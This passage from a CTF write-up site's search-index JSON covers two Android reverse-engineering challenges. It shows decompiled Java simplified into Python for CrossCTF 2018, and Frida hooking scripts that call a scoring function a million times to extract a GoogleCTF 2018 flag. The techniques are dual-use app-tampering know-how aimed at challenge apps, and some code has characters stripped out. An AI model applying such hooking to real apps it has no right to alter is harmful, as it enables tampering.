            "title": "CrossCTF Finals 2018 : Human Powered Flag Generator"
        }, 
        {
            "location": "/crossctf-finals2018/mobile/human/README/#first-blood-by-segfaulters", 
            "text": "Keep cranking until the whole flag appears!  Creator - prokarius (@prokarius)", 
            "title": "First Blood by : Segfaulters"
        }, 
        {
            "location": "/crossctf-finals2018/mobile/human/README/#static-analysis", 
            "text": "We are given an APK file, which upon extracting and converting to its Java code, we get:  package com.a2018.crossctf.humanpoweredflaggenerator;\n\nimport android.content.res.Resources;\nimport android.os.Bundle;\nimport android.support.v7.app.AppCompatActivity;\nimport android.view.View;\nimport android.widget.TextView;\n\npublic class MainActivity extends AppCompatActivity {\n    private TextView flagDisplay;\n    private TextView percent;\n    private Status status;\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView((int) C0185R.layout.activity_main);\n        this.status = new Status();\n        this.flagDisplay = (TextView) findViewById(C0185R.id.flagTextView);\n        this.percent = (TextView) findViewById(C0185R.id.percentTextView);\n        findViewById(C0185R.id.speedupButton).setOnClickListener(new MainActivity$$Lambda$0(this));\n        findViewById(C0185R.id.crankButton).setOnClickListener(new MainActivity$$Lambda$1(this));\n    }\n\n    final /* synthetic */ void lambda$onCreate$0$MainActivity(View view) {\n        this.status.speedUp();\n    }\n\n    final /* synthetic */ void lambda$onCreate$1$MainActivity(View view) {\n        crank();\n    }\n\n    private void crank() {\n        this.status.crank(3.8d);\n        Resources res = getResources();\n        this.flagDisplay.setText(res.getString(C0185R.string.flag, new Object[]{this.status.flag()}));\n        this.percent.setText(res.getString(C0185R.string.percent, new Object[]{Integer.valueOf(this.status.level()), this.status.percent()}));\n    }\n}  Seems like the app has a display for the flag, a display for percent of work done, and a button to 'work' to flag generation, and a button to speed up the process.  package com.a2018.crossctf.humanpoweredflaggenerator;\n\nimport android.annotation.SuppressLint;\nimport java.math.BigInteger;\n\nclass Status {\n    private BigInteger curr;\n    private BigInteger f9f;\n    private StringBuilder flagBuilder = new StringBuilder();\n    private BigInteger fmax;\n    private int level = 0;\n    private BigInteger max;\n    private BigInteger prod;\n\n    Status() {\n        upLevel();\n    }\n\n    public void crank(double am) {\n        double amount = Math.pow(am, (double) this.level);\n        for (int i = 0; ((double) i)   amount; i++) {\n            if (this.max.compareTo(this.curr) == 0) {\n                if (this.level != 13) {\n                    this.flagBuilder.append(extract());\n                    upLevel();\n                } else {\n                    return;\n                }\n            } else if (this.f9f.compareTo(this.fmax) == 0) {\n                this.curr = this.curr.add(BigInteger.ONE);\n                upF();\n            } else {\n                this.prod = this.prod.multiply(this.f9f);\n                this.f9f = this.f9f.add(BigInteger.ONE);\n            }\n        }\n    }\n\n    public String flag() {\n        return this.flagBuilder.toString();\n    }\n\n    public int level() {\n        return this.level;\n    }\n\n    @SuppressLint({ DefaultLocale })\n    public String percent() {\n        double frac = BigInteger.valueOf(10000).divide(this.max.subtract(BigInteger.ONE)).doubleValue();\n        double x = this.curr.doubleValue() - 1.0d;\n        return String.format( %.2f , new Object[]{Double.valueOf(Math.min(100.0d, (((BigInteger.valueOf(10000).multiply(this.f9f).divide(this.fmax).doubleValue() / 10000.0d) + x) * frac) / 100.0d))});\n    }\n\n    private void upLevel() {\n        this.level++;\n        this.max = BigInteger.ONE.shiftLeft(this.level).add(BigInteger.ONE);\n        this.curr = BigInteger.ONE;\n        this.prod = BigInteger.ONE;\n        upF();\n    }\n\n    private void upF() {\n        this.fmax = fastExpo(BigInteger.valueOf(5), this.curr).add(BigInteger.ONE);\n        this.f9f = BigInteger.ONE;\n    }\n\n    public void speedUp() {\n        while (this.prod.mod(BigInteger.TEN).equals(BigInteger.ZERO)) {\n            this.prod = this.prod.divide(BigInteger.TEN);\n        }\n    }\n\n    private String extract() {\n        BigInteger thousand = BigInteger.valueOf(1000);\n        speedUp();\n        return this.prod.mod(thousand).add(thousand).toString().substring(1);\n    }\n\n    private static BigInteger fastExpo(BigInteger x, BigInteger y) {\n        BigInteger out = BigInteger.ONE;\n        while (y.compareTo(BigInteger.ONE) != 0) {\n            if (y.and(BigInteger.ONE).equals(BigInteger.ONE)) {\n                out = out.multiply(x);\n            }\n            x = x.multiply(x);\n            y = y.shiftRight(1);\n        }\n        return out.multiply(x);\n    }\n}  (other useless files like lambda classes/resources files filtered out)  This seems like the meat of the app. Extracting this class out and running it on my local machine using a Java IDE, it seems that it takes a ... very long time ... yea no, running it won't solve the problem.  The  flagBuilder  is a StringBuilder containing the flag. I started out by combining the methods together so to form as few methods as possible, then I converted this to Python so that my eyes don't bleed from the verbosity of Java.  class Status:\n    __init__():\n        level=1\n        max = 3\n        curr = 1\n        prod =1\n        fmax = 6\n        f9f = 1\n        flag = ''\n\n    def crank(am):\n        amount = am**level;\n        for i in range(amount):\n            if max == curr \n                if level == 13:\n                    return\n                while prod%10==0:\n                    prod//=10\n                flag += str((prod%1000)+1000)[1:]\n                level++\n                max = 1 level +1\n                curr = 1\n                prod = 1\n                fmax = 6\n                f9f = 1\n            elif f9f == fmax:\n                curr++;\n                fmax = (5**curr) + 1\n                f9f = 1\n            else:\n                prod *= f9f;\n                f9f++;  The entire class can be replaced by just the crank method, as long as the state is stored within the function itself. We will do that, and things should get a lot simpler. The  crank()  code still looks really bad, so we can begin by simplifying the code. The code looks suspiciously like disassembled nested while loops, so I started with that concept, then made  crank()  return the flag instead of just shoving into a variable.  def crank():\n    flag = ''\n    for level in range(1,13):\n        prod=1\n        for curr in range(1, (1 level)+1):\n            fmax = 5**curr+1\n            for f9f in range(fmax)\n                prod *= f9f\n    while prod % 10 == 0:\n        prod = prod // 10\n    flag+= str(prod%1000).rjust(3,'0')\n    return flag  The innermost for loop can be simplified, so the code can be:  def crank():\n    flag = ''\n    for level in range(1,13):\n        prod=1\n        for curr in range(1, (1 level)+1):\n            prod *= factorial(curr)\n    while prod % 10 == 0:\n        prod = prod // 10\n    flag+= str(prod%1000).rjust(3,'0')\n    return flag  where  factorial  is the  factorial function, which I created to be a simple for-loop instead of recursion (python and its stack ;-;).  That's not the real problem of course. It took wayyyy to long.  Of course, it's because we are going to call factorial(5**(1 level)), which will take toooooo long.  I was going to use Wolfram Alpha's API to get the factorial of those large numbers, when I realised there was a pattern in the factorials of (5* i): the last 3 digits are repeating (984, 088, 016, 912), except for factorial(5* 1) which is 120.  Since the flag only cares about the last 3 digits of prod, which is the multiplication of all factorials of (5**i) in the range [1 to 1 level], we can replace the factorial function with one that gives only the last 3 digits:  def factorial(g):\n    if g == 1:\n        return 120\n    else:\n        return [984, 88, 16, 912][(g-2)%4]  The final code is in  here", 
            "title": "Static Analysis"
        }, 
        {
            "location": "/googlectf-quals2018/README/", 
            "text": "GoogleCTF Quals 2018\n\n\nIn this CTF we played with \nHATS Singapore\n and managed to solve only 4 challenges :'(\n\n\nReversing\n\n\nShall we play a game", 
            "title": "Overview"
        }, 
        {
            "location": "/googlectf-quals2018/README/#googlectf-quals-2018", 
            "text": "In this CTF we played with  HATS Singapore  and managed to solve only 4 challenges :'(", 
            "title": "GoogleCTF Quals 2018"
        }, 
        {
            "location": "/googlectf-quals2018/README/#reversing", 
            "text": "Shall we play a game", 
            "title": "Reversing"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/", 
            "text": "GoogleCTF Quals 2018 : Shall we play a game (re, 113 points, 111 solves)\n\n\nSummary\n\n\nWe are given an android \napp\n with a tic tac toe game. To obtain the flag, we need to win 1000000 times.\n\n\n\n\nStatic Analysis\n\n\nSolution\n\n\n\n\nStatic Analysis\n\n\nThe first thing I always do when getting an apk file (from a trusted source, of course) is to install it, to see what it is about. Since I have an Android device, it is very convenient for me to just use adb.\n\n\n$ adb install app.apk\n\n\n\n\n\n\nDecompilation\n\n\nFirst, I used jadx to decompile the app and view its source.\n\n\nLooking at AndroidManifest.xml, we see that GameActivity is the activity being launched at the start.\n\n\n...\n    \napplication android:theme=\n@style/AppTheme\n android:label=\n@string/app_name\n android:icon=\n@mipmap/ic_launcher\n android:name=\nandroid.support.multidex.MultiDexApplication\n android:allowBackup=\ntrue\n android:supportsRtl=\ntrue\n android:roundIcon=\n@mipmap/ic_launcher_round\n\n        \nactivity android:name=\ncom.google.ctf.shallweplayagame.GameActivity\n\n...\n\n\n\n\nIn GameActivity.java, the function I'm interested in at the start is \nonClick\n and \nonCreate\n. Nothing much happens in \nonCreate\n, just some initialization. As for \nonClick\n, looks like it is performing some game logic.\n\n\nHere's the code (variables and functions/methods are renamed by myself, if you want to look at the original source, it is \nhere\n).\n\n\npublic void onClick(View view) {\n    if (!this.hasLost \n this.animatorsQueue.isEmpty()) {\n        CellView cellView = (CellView) view;\n        if (cellView.isEmpty())) {\n            soundController.playToneA();\n            cellValue.setValue(CellView.X);\n            if (won(CellView.X)) {\n                updateScore();\n                return;\n            }\n            List l = getListOfNonEmptyCells();\n            if (l.isEmpty()) {\n                updateScore();\n                return;\n            }\n            getRandomElement(l).setValue(a.O);\n            if (won(a.O)) {\n                lost();\n                return;\n            } else {\n                animate();\n                return;\n            }\n        }\n        soundController.playToneB();\n    }\n}\n\nprotected void onCreate(Bundle bundle) {\n    super.onCreate(bundle);\n    setContentView((int) R.layout.activity_game);\n    LinearLayout linearLayout = (LinearLayout) findViewById(R.id.rows);\n    for (int i = 0; i \n 3; i++) {\n        View linearLayout2 = new LinearLayout(getApplicationContext());\n        for (int i2 = 0; i2 \n 3; i2++) {\n            View cell = new CellView(getApplicationContext(), this.m);\n            linearLayout2.addView(cell);\n            this.l[i2][i] = cell;\n            cell.setOnClickListener(this);\n        }\n        linearLayout.addView(linearLayout2);\n    }\n}\n\n\n\n\nThere's nothing interesting in \nanimate\n and \nlost\n, but \nupdateScore\n seems to have something more than just updating the score. In particular, a list \nbyteArray1\n is modifed during every call to \nupdateScore\n, and I suspect this should contain the flag in some form. And when our score reaches 1,000,000, \nshowFlag\n is invoked.\n\n\nvoid updateScore() {\n    for (int i = 0; i \n 3; i++) {\n        for (int i2 = 0; i2 \n 3; i2++) {\n            this.l[i2][i].setCellValue(a.EMPTY, 25);\n        }\n    }\n    animate();\n    this.score++;\n    Object _ = N._(Integer.valueOf(2), N.e, Integer.valueOf(2));\n    N._(Integer.valueOf(2), N.f, _, this.byteArray1);\n    this.byteArray1 = (byte[]) N._(Integer.valueOf(2), N.g, _);\n    if (this.score == 1000000) {\n        showFlag();\n        return;\n    }\n    ((TextView) findViewById(R.id.score)).setText(String.format(\n%d / %d\n, new Object[]{Integer.valueOf(this.score), Integer.valueOf(1000000)}));\n}\n\n\n\n\nHere, the app prints the flag, using values derived from \nbyteArray1\n and \nbyteArray2\n.\n\n\nvoid showFlag() {\n    Object _ = N._(Integer.valueOf(0), N.a, Integer.valueOf(0));\n    Object _2 = N._(Integer.valueOf(1), N.b, this.byteArray1, Integer.valueOf(1));\n    N._(Integer.valueOf(0), N.c, _, Integer.valueOf(2), _2);\n    ((TextView) findViewById(R.id.score)).setText(new String((byte[]) N._(Integer.valueOf(0), N.d, _, this.byteArray2)));\n    o();\n}\n\n\n\n\nLots of variables from the \nN\n class are being referenced. Taking a peek at it tells us they are different constants. But something catches our eye, the native function \n_\n.\n\n\npackage com.google.ctf.shallweplayagame;\n\nclass N {\n    static final int[] a = new int[]{0, 1, 0};\n    static final int[] b = new int[]{1, 0, 2};\n    static final int[] c = new int[]{2, 0, 1};\n    static final int[] d = new int[]{3, 0, 0};\n    static final int[] e = new int[]{4, 1, 0};\n    static final int[] f = new int[]{5, 0, 1};\n    static final int[] g = new int[]{6, 0, 0};\n    static final int[] h = new int[]{7, 0, 2};\n    static final int[] i = new int[]{8, 0, 1};\n\n    static {\n        System.loadLibrary(\nrary\n);\n    }\n\n    static native Object _(Object... objArr);\n}\n\n\n\n\nNative library\n\n\nTo obtain the native library shared object file, I used apktool to disassemble the app. \n\n\napktool gives smali files, but also contains shared object files, whereas jadx gives java files but there is no shared object file\n\n\n$ java -jar ~/Downloads/apktool_2.3.3.jar d auto_solve.apk\n\n\n\n\nOpening up the shared object file in IDA, my immediate thought is to not reverse it. Because \n_\n was an overloaded function, it seems like the native function does some type checking on the arguments before performing more complex operations on it, which involves a lot of other functions.\n\n\nSolution\n\n\nClearly, what we need to do now is to run \nupdateScore()\n 1,000,000 times. There are a few ways to this. \n\n\n\n\nPatching the smali file and build it back to an apk file, then install it.\n\n\nCreate a new Android project in Android Studio, and manually add all the relevant files, including native libraries, so this will be somewhat troublesome.\n\n\nUse frida to hook \nonCreate\n and run \nupdateScore()\n directly from there.\n\n\n\n\nWhy can't we just edit the .java file and build it directly?\n\n\nBecause jadx \ndecompiles\n the apk file, which means code is reconstructed using some heuristics, and does not preserve the project structure used by Android projects. So, we need to create a new Android project ourselves and add in all the stuff needed manually.\n\n\nOn the other hand, apktool \ndisassembles\n the apk file, which means it does not do any code generation by itself, preserving the project structure so it can easily build a patched apk file from that.\n\n\nUsing Frida\n\n\nI decided to use Frida as I didn't really feel like messing with the smali code at the time (wasn't very hard actually, someone else in the team did it).\n\n\nI figured the most convenient way to do it is to hook \nonCreate\n, let it initialize the stuff it needs, and then call \nn()\n 1000000 times from there. (In Frida, javascript is used for instrumentation.)\n\n\nJava.perform(function() {\n    var GameActivity = Java.use('com.google.ctf.shallweplayagame.GameActivity');\n\n    GameActivity.onCreate.overload('android.os.Bundle').implementation = function (v) {\n        this.onCreate(v)\n        for (var i = o; i \n 1000000; i++) {\n            send(i);\n            this.n();\n        }\n    };\n})\n\n\n\n\nThen, set up a Frida python script to run it.\n\n\ndef on_message(message, data):\n    global i, q, changed\n    if message['type'] == 'send':\n        print(\n[*] {0}\n.format(message['payload']))\n\nprint('[*] Spawning app')\ndevice = frida.get_usb_device()\npid = device.spawn('com.google.ctf.shallweplayagame')\nsession = device.attach(pid)\njscode = open('script.js', 'r').read()\nscript = session.create_script(jscode)\nscript.on('message', on_message)\nprint('[*] Running script')\nscript.load()\ndevice.resume(pid)\n\n\n\n\nAll looks good... until when it reaches around 10000 the app crashes. I suppose maybe using such a hooking approach may mess up garbage collection in the app, causing it to run out of memory.\n\n\nSpawn app repeatedly\n\n\nHowever, this is rather simply to deal with. I modified the js script to only run \nn()\n up to 10000 times, then dump the values of \nscore\n and \nbyteArray1\n, and store them in a global variable. Then, re-run the app and load those values into \nscore\n and \nbyteArray1\n to continue where we ended off.\n\n\ni = 0\nq = []\n\ndef on_message(message, data):\n    global i, q, changed\n    if message['type'] == 'send':\n        print(\n[*] {0}\n.format(message['payload']))\n        i = message['payload'][0]\n        q = message['payload'][1]\n        changed = True\n\n\n\n\nUsing a while loop, we can keep spawning the app until we get the flag.\n\n\nwhile True:\n    if i \n 1000000:\n        exit(0)\n\n    while not changed:\n        pass\n\n    changed = False\n\n    jscode = \n\nJava.perform(function() {\n    var GameActivity = Java.use('com.google.ctf.shallweplayagame.GameActivity');\n    o = %d\n\n    GameActivity.onCreate.overload('android.os.Bundle').implementation = function (v) {\n        this.onCreate(v)\n        %s\n        if (o \n 1000000) {\n            for (var i = o; i \n o + 20000; i++) {\n                this.n();\n            }\n            send([i, this.q.value]);\n        }\n        else {\n            this.m();\n        }\n    };\n\n    GameActivity.k.implementation = function () {\n    };\n})\n\n % (i, \nthis.q.value = Java.array('byte', %s)\n % q if i \n 0 else '')\n\n    print('Spawning app')\n    device = frida.get_usb_device()\n    pid = device.spawn('com.google.ctf.shallweplayagame')\n    session = device.attach(pid)\n    script = session.create_script(jscode)\n    script.on('message', on_message)\n    print('[*] Running script')\n    script.load()\n    device.resume(pid)\n\n\n\n\nFlag\n\n\nThis approach was really slow, it took around half an hour to finally get the flag. In contrast, if I'd just modified the smali code, it would have been complete in less than a second.\n\n\nNevertheless, I still preferred this solution as it is very easy to code. Then, I can just leave the script to run while doing some other stuff, and come back half an hour to get the flag. Unless I'm familiar with smali, it would have taken some brain effort to modify the code to get the flag.", 
            "title": "Shall we play a game"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/#googlectf-quals-2018-shall-we-play-a-game-re-113-points-111-solves", 
            "text": "", 
            "title": "GoogleCTF Quals 2018 : Shall we play a game (re, 113 points, 111 solves)"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/#summary", 
            "text": "We are given an android  app  with a tic tac toe game. To obtain the flag, we need to win 1000000 times.   Static Analysis  Solution", 
            "title": "Summary"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/#static-analysis", 
            "text": "The first thing I always do when getting an apk file (from a trusted source, of course) is to install it, to see what it is about. Since I have an Android device, it is very convenient for me to just use adb.  $ adb install app.apk", 
            "title": "Static Analysis"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/#decompilation", 
            "text": "First, I used jadx to decompile the app and view its source.  Looking at AndroidManifest.xml, we see that GameActivity is the activity being launched at the start.  ...\n     application android:theme= @style/AppTheme  android:label= @string/app_name  android:icon= @mipmap/ic_launcher  android:name= android.support.multidex.MultiDexApplication  android:allowBackup= true  android:supportsRtl= true  android:roundIcon= @mipmap/ic_launcher_round \n         activity android:name= com.google.ctf.shallweplayagame.GameActivity \n...  In GameActivity.java, the function I'm interested in at the start is  onClick  and  onCreate . Nothing much happens in  onCreate , just some initialization. As for  onClick , looks like it is performing some game logic.  Here's the code (variables and functions/methods are renamed by myself, if you want to look at the original source, it is  here ).  public void onClick(View view) {\n    if (!this.hasLost   this.animatorsQueue.isEmpty()) {\n        CellView cellView = (CellView) view;\n        if (cellView.isEmpty())) {\n            soundController.playToneA();\n            cellValue.setValue(CellView.X);\n            if (won(CellView.X)) {\n                updateScore();\n                return;\n            }\n            List l = getListOfNonEmptyCells();\n            if (l.isEmpty()) {\n                updateScore();\n                return;\n            }\n            getRandomElement(l).setValue(a.O);\n            if (won(a.O)) {\n                lost();\n                return;\n            } else {\n                animate();\n                return;\n            }\n        }\n        soundController.playToneB();\n    }\n}\n\nprotected void onCreate(Bundle bundle) {\n    super.onCreate(bundle);\n    setContentView((int) R.layout.activity_game);\n    LinearLayout linearLayout = (LinearLayout) findViewById(R.id.rows);\n    for (int i = 0; i   3; i++) {\n        View linearLayout2 = new LinearLayout(getApplicationContext());\n        for (int i2 = 0; i2   3; i2++) {\n            View cell = new CellView(getApplicationContext(), this.m);\n            linearLayout2.addView(cell);\n            this.l[i2][i] = cell;\n            cell.setOnClickListener(this);\n        }\n        linearLayout.addView(linearLayout2);\n    }\n}  There's nothing interesting in  animate  and  lost , but  updateScore  seems to have something more than just updating the score. In particular, a list  byteArray1  is modifed during every call to  updateScore , and I suspect this should contain the flag in some form. And when our score reaches 1,000,000,  showFlag  is invoked.  void updateScore() {\n    for (int i = 0; i   3; i++) {\n        for (int i2 = 0; i2   3; i2++) {\n            this.l[i2][i].setCellValue(a.EMPTY, 25);\n        }\n    }\n    animate();\n    this.score++;\n    Object _ = N._(Integer.valueOf(2), N.e, Integer.valueOf(2));\n    N._(Integer.valueOf(2), N.f, _, this.byteArray1);\n    this.byteArray1 = (byte[]) N._(Integer.valueOf(2), N.g, _);\n    if (this.score == 1000000) {\n        showFlag();\n        return;\n    }\n    ((TextView) findViewById(R.id.score)).setText(String.format( %d / %d , new Object[]{Integer.valueOf(this.score), Integer.valueOf(1000000)}));\n}  Here, the app prints the flag, using values derived from  byteArray1  and  byteArray2 .  void showFlag() {\n    Object _ = N._(Integer.valueOf(0), N.a, Integer.valueOf(0));\n    Object _2 = N._(Integer.valueOf(1), N.b, this.byteArray1, Integer.valueOf(1));\n    N._(Integer.valueOf(0), N.c, _, Integer.valueOf(2), _2);\n    ((TextView) findViewById(R.id.score)).setText(new String((byte[]) N._(Integer.valueOf(0), N.d, _, this.byteArray2)));\n    o();\n}  Lots of variables from the  N  class are being referenced. Taking a peek at it tells us they are different constants. But something catches our eye, the native function  _ .  package com.google.ctf.shallweplayagame;\n\nclass N {\n    static final int[] a = new int[]{0, 1, 0};\n    static final int[] b = new int[]{1, 0, 2};\n    static final int[] c = new int[]{2, 0, 1};\n    static final int[] d = new int[]{3, 0, 0};\n    static final int[] e = new int[]{4, 1, 0};\n    static final int[] f = new int[]{5, 0, 1};\n    static final int[] g = new int[]{6, 0, 0};\n    static final int[] h = new int[]{7, 0, 2};\n    static final int[] i = new int[]{8, 0, 1};\n\n    static {\n        System.loadLibrary( rary );\n    }\n\n    static native Object _(Object... objArr);\n}", 
            "title": "Decompilation"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/#native-library", 
            "text": "To obtain the native library shared object file, I used apktool to disassemble the app.   apktool gives smali files, but also contains shared object files, whereas jadx gives java files but there is no shared object file  $ java -jar ~/Downloads/apktool_2.3.3.jar d auto_solve.apk  Opening up the shared object file in IDA, my immediate thought is to not reverse it. Because  _  was an overloaded function, it seems like the native function does some type checking on the arguments before performing more complex operations on it, which involves a lot of other functions.", 
            "title": "Native library"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/#solution", 
            "text": "Clearly, what we need to do now is to run  updateScore()  1,000,000 times. There are a few ways to this.    Patching the smali file and build it back to an apk file, then install it.  Create a new Android project in Android Studio, and manually add all the relevant files, including native libraries, so this will be somewhat troublesome.  Use frida to hook  onCreate  and run  updateScore()  directly from there.   Why can't we just edit the .java file and build it directly?  Because jadx  decompiles  the apk file, which means code is reconstructed using some heuristics, and does not preserve the project structure used by Android projects. So, we need to create a new Android project ourselves and add in all the stuff needed manually.  On the other hand, apktool  disassembles  the apk file, which means it does not do any code generation by itself, preserving the project structure so it can easily build a patched apk file from that.", 
            "title": "Solution"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/#using-frida", 
            "text": "I decided to use Frida as I didn't really feel like messing with the smali code at the time (wasn't very hard actually, someone else in the team did it).  I figured the most convenient way to do it is to hook  onCreate , let it initialize the stuff it needs, and then call  n()  1000000 times from there. (In Frida, javascript is used for instrumentation.)  Java.perform(function() {\n    var GameActivity = Java.use('com.google.ctf.shallweplayagame.GameActivity');\n\n    GameActivity.onCreate.overload('android.os.Bundle').implementation = function (v) {\n        this.onCreate(v)\n        for (var i = o; i   1000000; i++) {\n            send(i);\n            this.n();\n        }\n    };\n})  Then, set up a Frida python script to run it.  def on_message(message, data):\n    global i, q, changed\n    if message['type'] == 'send':\n        print( [*] {0} .format(message['payload']))\n\nprint('[*] Spawning app')\ndevice = frida.get_usb_device()\npid = device.spawn('com.google.ctf.shallweplayagame')\nsession = device.attach(pid)\njscode = open('script.js', 'r').read()\nscript = session.create_script(jscode)\nscript.on('message', on_message)\nprint('[*] Running script')\nscript.load()\ndevice.resume(pid)  All looks good... until when it reaches around 10000 the app crashes. I suppose maybe using such a hooking approach may mess up garbage collection in the app, causing it to run out of memory.", 
            "title": "Using Frida"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/#spawn-app-repeatedly", 
            "text": "However, this is rather simply to deal with. I modified the js script to only run  n()  up to 10000 times, then dump the values of  score  and  byteArray1 , and store them in a global variable. Then, re-run the app and load those values into  score  and  byteArray1  to continue where we ended off.  i = 0\nq = []\n\ndef on_message(message, data):\n    global i, q, changed\n    if message['type'] == 'send':\n        print( [*] {0} .format(message['payload']))\n        i = message['payload'][0]\n        q = message['payload'][1]\n        changed = True  Using a while loop, we can keep spawning the app until we get the flag.  while True:\n    if i   1000000:\n        exit(0)\n\n    while not changed:\n        pass\n\n    changed = False\n\n    jscode =  \nJava.perform(function() {\n    var GameActivity = Java.use('com.google.ctf.shallweplayagame.GameActivity');\n    o = %d\n\n    GameActivity.onCreate.overload('android.os.Bundle').implementation = function (v) {\n        this.onCreate(v)\n        %s\n        if (o   1000000) {\n            for (var i = o; i   o + 20000; i++) {\n                this.n();\n            }\n            send([i, this.q.value]);\n        }\n        else {\n            this.m();\n        }\n    };\n\n    GameActivity.k.implementation = function () {\n    };\n})  % (i,  this.q.value = Java.array('byte', %s)  % q if i   0 else '')\n\n    print('Spawning app')\n    device = frida.get_usb_device()\n    pid = device.spawn('com.google.ctf.shallweplayagame')\n    session = device.attach(pid)\n    script = session.create_script(jscode)\n    script.on('message', on_message)\n    print('[*] Running script')\n    script.load()\n    device.resume(pid)", 
            "title": "Spawn app repeatedly"
        }, 
        {
            "location": "/googlectf-quals2018/re/shallweplayagame/README/#flag", 
            "text": "This approach was really slow, it took around half an hour to finally get the flag. In contrast, if I'd just modified the smali code, it would have been complete in less than a second.  Nevertheless, I still preferred this solution as it is very easy to code. Then, I can just leave the script to run while doing some other stuff, and come back half an hour to get the flag. Unless I'm familiar with smali, it would have taken some brain effort to modify the code to get the flag.", 
            "title": "Flag"
        }
    ]
}